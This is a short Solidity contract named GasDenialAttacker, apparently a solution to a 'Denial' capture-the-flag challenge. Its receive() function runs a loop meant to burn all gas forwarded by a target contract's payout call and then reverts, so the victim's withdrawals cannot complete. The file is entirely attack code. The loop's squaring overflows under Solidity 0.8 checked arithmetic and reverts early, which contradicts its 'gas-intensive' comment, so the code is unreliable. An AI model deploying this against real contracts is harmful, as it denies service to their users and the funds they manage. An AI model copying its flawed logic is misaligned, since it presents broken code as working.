pragma solidity ^0.8.0;

contract GasDenialAttacker {
    address public denial;

    constructor(address _denial) {
        denial = _denial;
    }

    receive() external payable {
        uint256 gas = gasleft();
        while (gas > 10000) {
            gas = gasleft();
            // Gas-intensive loop
            for (uint256 i = 0; i < 2**10; i++) {
                gas = gas * gas;
            }
        }
        revert();
    }
}